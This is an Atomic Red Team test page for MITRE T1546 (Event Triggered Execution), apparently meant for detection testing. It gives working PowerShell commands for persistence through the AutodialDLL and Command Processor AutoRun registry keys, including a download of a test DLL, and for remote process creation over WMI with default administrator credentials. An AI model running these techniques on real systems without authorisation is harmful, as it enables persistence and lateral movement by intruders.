---
tags: [T1546, atomic_test]
filename: "[[T1546 - Event Triggered Execution]]"
---
# T1546 - Event Triggered Execution

## Atomic Test #1 - Persistence with Custom AutodialDLL
The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. 

The sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.
[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)

**Supported Platforms:** Windows


**auto_generated_guid:** aca9ae16-7425-4b6d-8c30-cad306fdbd5b






#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
```

#### Cleanup Commands:
```powershell
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
```



#### Dependencies:  Run with `powershell`!
##### Description: AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
##### Check Prereq Commands:
```powershell
if (Test-Path PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll) { exit 0} else { exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\" -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"
```




<br/>
<br/>

## Atomic Test #2 - HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)
An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.
[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)

**Supported Platforms:** Windows


**auto_generated_guid:** a574dafe-a903-4cce-9701-14040f4f3532





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| command | Command to Execute | string | notepad.exe|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "#{command}" -PropertyType "String"
```

#### Cleanup Commands:
```powershell
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
```





<br/>
<br/>

## Atomic Test #3 - HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)
An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.
[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)

**Supported Platforms:** Windows


**auto_generated_guid:** 36b8dbf9-59b1-4e9b-a3bb-36e80563ef01





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| command | Command to Execute | string | notepad.exe|


#### Attack Commands: Run with `powershell`! 


```powershell
$path = "HKCU:\Software\Microsoft\Command Processor"
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name "AutoRun" -Value "#{command}" -PropertyType "String"
```

#### Cleanup Commands:
```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
```





<br/>
<br/>

## Atomic Test #4 - WMI Invoke-CimMethod Start Process
The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.
This is a novel way to perform lateral movement or to start a remote process.
This does require WinRM to be enabled. The account performing the run will also need to be elevated.
A successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.

**Supported Platforms:** Windows


**auto_generated_guid:** adae83d3-0df6-45e7-b2c3-575f91584577





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| dest | destination computer name | string | localhost|
| password | password for account | string | P@ssword1|
| username | account to use | string | Administrator|
| process | process to spawn | string | calc.exe|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
# Set the remote computer name and credentials
 $RemoteComputer = "#{dest}"
 $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "#{process}"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession
```






<br/>
